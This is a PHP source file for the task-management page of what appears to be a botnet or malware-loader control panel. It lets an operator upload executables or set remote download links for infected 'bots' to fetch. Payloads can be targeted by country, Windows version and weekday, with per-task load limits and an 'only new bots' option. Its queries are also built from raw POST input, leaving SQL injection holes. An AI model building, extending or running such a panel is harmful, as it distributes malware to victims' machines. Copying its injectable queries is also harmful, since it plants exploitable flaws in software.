<?php
defined('CP') or die();


function Tasks($database)
{
	global $lang, $syslang;
	if(!empty($_POST['updatetask'])){
		if(is_uploaded_file($_FILES["update_file"]["tmp_name"]))
		{
			
			$result = mysqli_query($database, "SELECT * FROM `task` WHERE `id` = '{$_POST['taskid']}'") or die(mysqli_error($database));
			$row = mysqli_fetch_row($result) or die(mysqli_error($database)); 
			mysqli_free_result($result);
		
			if(move_uploaded_file($_FILES["update_file"]["tmp_name"], "files/".$row[2]))
			{
				$sql = "UPDATE `task` SET `filename` = '{$_FILES["update_file"]["name"]}' WHERE `id` = '{$row[0]}';";
				mysqli_query($database, $sql) or die(mysqli_error($database));
				header('Location: ?cp=tasks');
			}
		}else
		{
			$interval = 60;
			if(!empty($_POST['inputInterval']))
				$interval = $_POST['inputInterval'];
			$sql = "";
			
			if(!empty($_POST['inputLink']))
				$sql .= "UPDATE `task` SET `autoupdate` = '1', `updatelink` = '{$_POST['inputLink']}', `updateinterval` = '{$interval}' WHERE `id` = '{$_POST['taskid']}';";
			else
				$sql .= "UPDATE `task` SET `updateinterval` = '{$interval}' WHERE `id` = '{$_POST['taskid']}';";
			mysqli_query($database, $sql) or die(mysqli_error($database));
			header('Location: ?cp=tasks');
		}
	}
	
	
	if(!empty($_POST['addtask']))
	{
		if(is_uploaded_file($_FILES["upload_file"]["tmp_name"]))
		{
			$fileName = $_FILES["upload_file"]["name"];
			$fileHash = md5($fileName.time());
			move_uploaded_file($_FILES["upload_file"]["tmp_name"], "files/".$fileHash);

		if (!empty($_POST['cc']) && is_array($_POST['cc']) && count($_POST['cc']) != count($lang[$syslang]['countrylist'])){
			foreach ($_POST['cc'] as $k => $v)$ccl2[] = $k;
			$cclist2 = implode(',', $ccl2);
		}else{
			$cclist2 = "ALL";
		}

		$inputLoads = 0;
		if(!empty($_POST['inputLoads']) && is_numeric($_POST['inputLoads']))
			$inputLoads = $_POST['inputLoads'];
	
		$monday = 0;if(!empty($_POST['monday']))$monday = 1;
		$tuesday = 0;if(!empty($_POST['tuesday']))$tuesday = 1;
		$wednesday = 0;if(!empty($_POST['wednesday']))$wednesday = 1;
		$thursday = 0;if(!empty($_POST['thursday']))$thursday = 1;
		$friday = 0;if(!empty($_POST['friday']))$friday = 1;
		$saturday = 0;if(!empty($_POST['saturday']))$saturday = 1;
		$sunday = 0;if(!empty($_POST['sunday']))$sunday = 1;

		$WinXP = 0;if(!empty($_POST['WinXP']))$WinXP = 1;
		$WinVista = 0;if(!empty($_POST['WinVista']))$WinVista = 1;
		$Win7 = 0;if(!empty($_POST['Win7']))$Win7 = 1;
		$Win8 = 0;if(!empty($_POST['Win8']))$Win8 = 1;
		$Win10 = 0;if(!empty($_POST['Win10']))$Win10 = 1;
    
	
		$days = "";
		if(!empty($_POST['taskWork']) && $_POST['taskWork'] == 2){
			$days .= ($monday == 0 ? "" : "1,");
			$days .= ($tuesday == 0 ? "" : "2,");
			$days .= ($wednesday == 0 ? "" : "3,");
			$days .= ($thursday == 0 ? "" : "4,");
			$days .= ($friday == 0 ? "" : "5,");
			$days .= ($saturday == 0 ? "" : "6,");
			$days .= ($sunday == 0 ? "" : "7,");
			$days = substr($days, 0, -1);
		}else
			$days = "1,2,3,4,5,6,7";
		$osstr = "";
		if($WinXP == 1 || $WinVista == 1 || $Win7 == 1 || $Win8 == 1 || $Win10 == 1)
		{
			$osstr .= ($WinXP == 0 ? "" : "1,");
			$osstr .= ($WinVista == 0 ? "" : "2,");
			$osstr .= ($Win7 == 0 ? "" : "3,");
			$osstr .= ($Win8 == 0 ? "" : "4,");
			$osstr .= ($Win10 == 0 ? "" : "5,");
			$osstr = substr($osstr, 0, -1);
		}else $osstr = "ALL";
	

	 
		$TimeAdll = time();
		$onlynewbots = 0;
		if(isset($_POST['onlynewbots']))
			$onlynewbots = 1;
		
		$sql = "INSERT INTO `task` (`id`, `filename`, `filehash`, `active`, `country`, `os`, `days`, `need`, `complete`, `timeAdd`, `onlynewbots`, `autoupdate`, `updatelink`, `updateinterval`) VALUES (NULL, '$fileName', '$fileHash', '1', '$cclist2', '$osstr', '$days', '$inputLoads', '0', '$TimeAdll', '$onlynewbots', '0', '', '0')";
		mysqli_query($database, $sql) or die(mysqli_error($database));
	
					
		}	
	}
	 
	 
	if(!empty($_GET['cleartasks']))
	{
		mysqli_query($database, "TRUNCATE TABLE `task`") or die(mysqli_error($database));
	
		$files = glob('./files/*'); 
		foreach($files as $file){ 
		if(is_file($file))
			unlink($file); 
		}
		header('Location: ?cp=tasks');
	}
	if(isset($_GET['delete']) || isset($_GET['stop']) || isset($_GET['start']))
	{
		$type = 0;
		if(!empty($_GET['delete'])){
			$id = $_GET['delete'];
			$type = 1;
		}else if(!empty($_GET['stop'])){
			$id = $_GET['stop'];
			$type = 2;
		}else if(!empty($_GET['start'])){
			$id = $_GET['start'];
			$type = 3;
	}

	$id = filter_var($id, FILTER_SANITIZE_NUMBER_INT, FILTER_FLAG_STRIP_HIGH); 
	if(!is_numeric($id))die('Invalid UID number!');

	$query[1] = "SELECT (`filehash`) FROM `task` WHERE `id` = {$id}";
	$query[2] = "SELECT (`active`) FROM `task` WHERE `id` = {$id}";
	$query[3] = $query[2];
	
	$result = mysqli_query($database, $query[$type]) or die(mysqli_error($database));
	$row = mysqli_fetch_array($result) or die(mysqli_error($database));

	if(isset($row[0]))
	{
		if($type == 1)
		{
			$file = "./files/{$row[0]}";
			if(is_file($file))
			{
				unlink($file);
				mysqli_query($database, "DELETE FROM `task` WHERE `id` = {$id}") or die(mysqli_error($database));
			}
		}else if($type == 2){
			mysqli_query($database, "UPDATE `task` SET `active` = '0' WHERE `id` = {$id}") or die(mysqli_error($database));
			
		}else if($type == 3){
			mysqli_query($database, "UPDATE `task` SET `active` = '1' WHERE `id` = {$id}") or die(mysqli_error($database));
		}
	}

		header('Location: ?cp=tasks');
	}



	$countrylists = '<fieldset class="collapsible">';
	
foreach($lang[$syslang]['countrylist'] as $key => $value)
	$countrylists .=  "<div class=\"w33p small checkbox\"><label><input type=\"checkbox\" class=\"cc\" name=\"cc[$key]\" value=\"1\"><span class=\"cr\"><i class=\"cr-icon fa fa-check\"></i></span><i class=\"f-$key\"></i> <mark>[$key]</mark> $value</label></div>\n"; 

					
			
					
$taskadd_modal = <<<DATA
<div class="modal fade" id="AddNewTask" role="dialog" aria-labelledby="myAddNewTask" aria-hidden="true">
<div class="modal-dialog modal-lg">
<div class="modal-content">
	<div class="modal-header modal-header-info">
	<button type="button" class="close" data-dismiss="modal" aria-hidden="true"><i class="fa fa-times"></i></button>
	<p>&nbsp;</p>
	</div>
	<div class="modal-body">
	<div class="wizard">
	<div class="wizard-inner">
		<ul class="nav nav-tabs" role="tablist" id="taskaddnavbar">
			<li role="presentation" class="active">
				<a href="#step1" data-toggle="tab" aria-controls="step1" role="tab"> 
					<span class="round-tab"> <i class="fa fa-upload"></i></span>
				</a>
			</li>
			<li role="presentation" class="disabled">
				<a href="#step2" data-toggle="tab" aria-controls="step2" role="tab"> 
					<span class="round-tab"> <i class="fa fa-globe"></i></span>
				</a>
			</li>
			<li role="presentation" class="disabled">
				<a href="#step3" data-toggle="tab" aria-controls="step3" role="tab">
					<span class="round-tab"> <i class="fa fa-sliders"></i></span>
				</a>
			</li>
		</ul>
	</div>
 
	<form method="post" id="newtask" class="form-horizontal" enctype="multipart/form-data">
	<div class="tab-content">
		<div class="tab-pane active" role="tabpanel" id="step1">
			<div class="container-fluid">
				<div class="row">
				<div class="col-md-5 col-md-offset-5"> 
				
					<label class="btn btn-primary pagination-centered"> 
						<input type="file" name="upload_file" style="left:-9999px;position:absolute" />
						<i class="fa fa-folder-open-o"></i> {$lang[$syslang]['uploadfile']} 
					</label>
					
					<p>&nbsp;</p>
					</div>
				</div>
			</div>
		</div>
 
		<div class="tab-pane" role="tabpanel" id="step2"> 
			{$countrylists}
			<ul class="pagination" align="center">
				<li><button type="button" class="btn btn-default btn-small prev-step">{$lang[$syslang]['previous']}</button></li>
				<li><button type="button" class="btn btn-link btn-small" onclick="select_all()"> {$lang[$syslang]['checkAll']}</button></li>
				<li><button type="button" class="btn btn-primary btn-small next-step">{$lang[$syslang]['next']}</button></li>
			</ul>
		</div>
 
		<div class="tab-pane" role="tabpanel" id="step3">
			<div class="row">
				<div class="col-md-3" style="margin:0 0 0 2%"> <b>{$lang[$syslang]['amount']}:</b></div>
				<div class="col-md-4"> <input type="text" class="form-control input-sm" name="inputLoads" placeholder="0 - unlim">
					<div class="checkbox">	
						<label> 
							<input type="checkbox" name="onlynewbots" style="position:absolute;">
								<span class="cr">
									<i class="cr-icon fa fa-check"></i>
								</span> {$lang[$syslang]['newbots']}
						</label>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="row">
					<div class="page-delimiter">&nbsp;</div>
					<div class="col-md-4 td_col_zag" style="margin:0 0 0 4%">
						<b>{$lang[$syslang]['osstr']}:</b>
					</div>
					<div class="col-md-6">
						<div class="checkbox">
							<label> 
								<input type="checkbox" name="WinXP" checked> 
								<span class="cr"><i class="cr-icon fa fa-windows"></i></span> Windows XP 
							</label>
							
							<label> 
								<input type="checkbox" name="WinVista" checked> 
								<span class="cr"><i class="cr-icon fa fa-windows"></i></span> Windows Vista 
							</label>
							
							<label>
								<input type="checkbox" name="Win7" checked> 
								<span class="cr"><i class="cr-icon fa fa-windows"></i></span> Windows 7 
							</label> 
							
							<label> 
								<input type="checkbox" name="Win8" checked> 
								<span class="cr"><i class="cr-icon fa fa-windows"></i></span> Windows 8 
							</label> 
							
							<label style="margin:2% 0 0 35%">
								<input type="checkbox" name="Win10" checked> 
								<span class="cr"><i class="cr-icon fa fa-windows"></i></span> Windows 10 
							</label>
						</div>
					</div>
				</div>
				<div class="row">
					<div class="page-delimiter">&nbsp;</div>
					<div class="col-md-4">
						<div class="col-sm-12">
							<div class="radio"> 
								<label>
									<input type="radio" name="taskWork" value="1" checked> <span class="cr">
									<i class="cr-icon fa fa-circle"></i></span> <b>{$lang[$syslang]['roundtheclock']}</b>
								</label>
							</div>
							<div class="radio"> 
								<label>
									<input type="radio" name="taskWork" value="2"> <span class="cr">
									<i class="cr-icon fa fa-circle"></i></span> <b>{$lang[$syslang]['selectdays']}</b> 
								</label>
							</div>
						</div>
					</div>
					<div class="col-md-7">
						<p>&nbsp;</p>
						<div class="btn-group" data-toggle="buttons"> 
							<label class="btn btn-default active disabled taskWeek"> 
								<input type="checkbox" name="monday" checked> {$lang[$syslang]['monday']} 
							</label>
							<label class="btn btn-default active disabled taskWeek"> 
								<input type="checkbox" name="tuesday" checked> {$lang[$syslang]['tuesday']}
							</label>
							<label class="btn btn-default active disabled taskWeek">
								<input type="checkbox" name="wednesday" checked> {$lang[$syslang]['wednesday']}
							</label> 
							<label class="btn btn-default active disabled taskWeek">
								<input type="checkbox" name="thursday" checked> {$lang[$syslang]['thursday']}
							</label> 
							<label class="btn btn-default active disabled taskWeek"> 
								<input type="checkbox" name="friday" checked> {$lang[$syslang]['friday']} 
							</label> 
							<label class="btn btn-default disabled taskWeek">
								<input type="checkbox" value="saturday"> {$lang[$syslang]['saturday']} 
							</label>
							<label class="btn btn-default disabled taskWeek"> 
								<input type="checkbox" value="sunday"> {$lang[$syslang]['sunday']}
							</label>
						</div>
					</div>
				</div>
				<p>&nbsp;</p>
				<input type="submit" class="btn btn-primary btn-lg btn-block" value="{$lang[$syslang]['addtask']}" name="addtask">
			</div>
		</div>
	</div>
	</form>
	</div>
	</div>
</div>
</div>
</div>
DATA;

if(!empty($_GET["page"]))$shift = 5 * ($_GET["page"] - 1);
else $shift = 0;

$DBtasks = mysqli_query($database, "SELECT * FROM `task` LIMIT $shift, 5") or die(mysqli_error());

$taskid = -1;
if(!empty($_GET['taskid']))
	$taskid = $_GET['taskid'];



  if(mysqli_num_rows($DBtasks) > 0)
  {
	$rs_result = mysqli_query($database, "SELECT COUNT('id') FROM `task`") or die(mysqli_error($database)); 
	$row = mysqli_fetch_row($rs_result) or die(mysqli_error($database)); 
	mysqli_free_result($rs_result);
	
	$Pagination =  pagination($row[0], 5, $_SERVER["REQUEST_URI"]);

	$status['0'] = "<span class=\"label label-default\">{$lang[$syslang]['inactive']}</span>";
	$status['1'] = "<span class=\"label label-success\">{$lang[$syslang]['active']}</span>";

	$columns = "";
	while($row = mysqli_fetch_array($DBtasks))
	{
		$country = "";
		if($row['country'] == "ALL") $country = $lang[$syslang]['all'];
		else $country = $row['country'];
		
		$task_os = "";
		if($row['os'] == "ALL")
			$task_os = $lang[$syslang]['all'];
		else
		{
			$array_os = explode(',', $row['os']);
	
			foreach ($array_os as &$value) {
		
			$task_os .= $value == 1 ? "WinXP, " : "";
			$task_os .= $value == 2 ? "WinVista, " : "";
			$task_os .= $value == 3 ? "Win7, " : "";
			$task_os .= $value == 4 ? "Win8, " : "";
			$task_os .= $value == 5 ? "Win10, " : "";
		
			}
			$task_os = substr($task_os, 0, -2);

		}
		$task_days = "";
		if($row['days'] == "1,2,3,4,5,6,7")
			$task_days = $lang[$syslang]['roundtheclock'];
		elseif ($row['days'] == "1,2,3,4,5")
		{
			$task_days = $lang[$syslang]['worktime'];
		}else
		{
			$array_days = explode(',', $row['days']);
	
			foreach ($array_days as &$value) {
			$task_days .= $value == 1 ? $lang[$syslang]['monday'].", " : "";
			$task_days .= $value == 2 ? $lang[$syslang]['tuesday'].", " : "";
			$task_days .= $value == 3 ? $lang[$syslang]['wednesday'].", " : "";
			$task_days .= $value == 4 ? $lang[$syslang]['thursday'].", " : "";
			$task_days .= $value == 5 ? $lang[$syslang]['friday'].", " : "";
			$task_days .= $value == 6 ? $lang[$syslang]['saturday'].", " : "";
			$task_days .= $value == 7 ? $lang[$syslang]['sunday'].", " : "";
			}
			$task_days = substr($task_days, 0, -2);

		}
		$mainclass = "";
		if($taskid == $row['id'])
			$mainclass .= "class=\"danger\"";
		$size = LDRfilesize($row['filehash']);
		$addTime = date("y.m.d H:i", $row['timeAdd']);
	
		$taskAutoUpdateInterval = 60;
		if(!empty($row['updateinterval']))
			$taskAutoUpdateInterval = $row['updateinterval'];
		$taskAutoUpdateLink = "http://example.com/file.exe";
		if(!empty($row['updatelink']))
			$taskAutoUpdateLink = $row['updatelink'];
		
		
		$taskAction = "<a class=\"btn btn-default btn-sm\" href=\"?cp=tasks&"
		.($row['active'] == 1 ? "stop={$row['id']}\"><i class=\"fa fa-stop\"></i> {$lang[$syslang]['stop']}" : "start={$row['id']}\"><i class=\"fa fa-play\"></i> {$lang[$syslang]['start']}")."</a>";
		
		$taskLimit = $row['need'] == 0 ? "#" : $row['need'];
		$columns .= <<<DATA
			<tr {$mainclass}>
	<th scope="row">{$row['id']}</th>
	<td><span class="small">{$addTime}</span></td>
	<td>{$row['filename']} <a class="small" data-toggle="modal" href="#updatetask{$row['id']}">{$lang[$syslang]['update']}</a> <i class="text-muted small">({$size})</i></td>
	<td> 
		<samp> 
			<mark class="info">{$lang[$syslang]['os']}:</mark> <code><i class="small">{$task_os}</i></code> 
			<mark>{$lang[$syslang]['time']}:</mark> <code><i class="small">{$task_days}</i></code> </br>
			<mark>{$lang[$syslang]['countries']}:</mark> <code><i class="small">{$country}</i> </code>
		</samp>
	</td>
	<td data-toggle="tooltip" data-placement="left" title="Tooltip on left">{$row['complete']}/{$taskLimit}</td>
	<td class="text-center">{$status[$row['active']]}</td>
	<td>
		<div class="btn-group btn-group-justified"> {$taskAction}
			<a href="?cp=tasks&delete={$row['id']}" class="btn btn-danger btn-sm"><i class="fa fa-ban"></i> {$lang[$syslang]['delete']}</a>
		</div>
	</td>
</tr>
  <div id="updatetask{$row['id']}" class="modal fade modal-message" style="display:none" aria-hidden="true">
	 <div class="modal-dialog">
	 <div class="modal-content">
		 <div class="modal-body">
		  <div style="position:absolute;z-index:2;margin-left:auto;margin-right:auto;left:0;right:0;">
		 </br>
		 <form method="post" id="updatetask" class="form-horizontal" enctype="multipart/form-data">
			<h4>{$lang[$syslang]['aupdtsk']}</h4>
			<div class="page-delimiter">&nbsp;</div>
			</br>
			 <div class="form-group">
				<label for="inputInterval" class="col-sm-2 control-label">{$lang[$syslang]['interval']}</label>
				 <div class="col-sm-3">
						<input type="text" class="form-control input-sm" id="inputInterval" name="inputInterval" placeholder="{$taskAutoUpdateInterval}">
				</div>
				</br>
			 </div>
			 <div class="form-group">
				<label for="inputLink" class="col-sm-2 control-label">{$lang[$syslang]['file']}</label>
				<div class="col-sm-7">
					<input type="url" class="form-control" id="inputLink" name="inputLink" placeholder="{$taskAutoUpdateLink}">
				</div>
			</div>
	<p>&nbsp;</p>
		</br>
		
			<h4>{$lang[$syslang]['or']}</h4>
		<p>&nbsp;</p>
			<label class="btn btn-primary pagination-centered"> 
						<input type="file" name="update_file" style="left:-9999px;position:absolute" />
						<i class="fa fa-folder-open-o"></i> {$lang[$syslang]['uploadfile']} 
					</label>
		<p>&nbsp;</p>
		<div class="page-delimiter">&nbsp;</div>
		</div>
		 <p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
		 <p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
		 <p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
		 <p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
		 </div>
		 
		 <div class="modal-footer"> 
			<input type="hidden" name="taskid" value="{$row['id']}">
			<button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> {$lang[$syslang]['cancel']}</button>
			<input type="submit" class="btn btn-primary" value="{$lang[$syslang]['save']}" name="updatetask">
		 </div>
	 </div>
	 </div>
	 </form>
 </div> 
DATA;
		
	}
	
	print <<<DATA
	<div class="row">
	<div class="col-md-4 col-md-offset-8">
		<div class="btn-toolbar"> 
			<a data-toggle="modal" href="#AddNewTask" style="float:right" class="btn btn-primary">
				<i class="fa fa-plus"></i> {$lang[$syslang]['addtask']}
			</a>
			 <a data-toggle="modal" href="#DeleteAll" style="float:right" class="btn btn-primary">
				<i class="fa fa-trash-o"></i> {$lang[$syslang]['delalltaskbtn']}
			 </a>
		 </div>
		 <p>&nbsp;</p>
	 </div>
 </div>
 
 <div class="panel panel-default">
	 <table class="table table-bordered table-striped table-condensed">
		 <thead>
			 <tr class="info">
				 <th>#</th>
				 <th class="text-center col-md-1">{$lang[$syslang]['date']}</th>
				 <th class="text-center col-md-1">{$lang[$syslang]['file']}</th>
				 <th class="text-center col-md-6">{$lang[$syslang]['options']}</th>
				 <th class="text-center">{$lang[$syslang]['stats']}</th>
				 <th class="text-center">{$lang[$syslang]['status']}</th>
				 <th class="text-center col-md-2">{$lang[$syslang]['action']}</th>
			 </tr>
		 </thead>
		<tbody> {$columns}</tbody>
	 </table>
 </div>
 
 <div class="text-center"> {$Pagination}</div>
 <div id="DeleteAll" class="modal modal-message modal-danger fade" style="display:none" aria-hidden="true">
	 <div class="modal-dialog">
	 <div class="modal-content">
		 <div class="modal-header"> 
			<i class="fa fa-exclamation-triangle"></i>
		 </div>
		 
		 <div class="modal-body">
			{$lang[$syslang]['remalltasks']}
		 </div>
		 
		 <div class="modal-footer"> 
			<button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> {$lang[$syslang]['cancel']}</button>
			<a href="?cp=tasks&cleartasks=true" class="btn btn-danger"><i class="fa fa-check"></i> {$lang[$syslang]['yes']}</a>
		 </div>
	 </div>
	 </div>
 </div> 
 {$taskadd_modal}
DATA;
  }
  else
  {
	  print "<p>&nbsp;</p><div class=\"col-md-4 col-md-offset-4\"> <a data-toggle=\"modal\" href=\"#AddNewTask\" class=\"btn btn-primary btn-lg btn-block\"> <i class=\"fa fa-plus\"></i> {$lang[$syslang]['addtask']} </a></div> {$taskadd_modal}";
  }

}

?>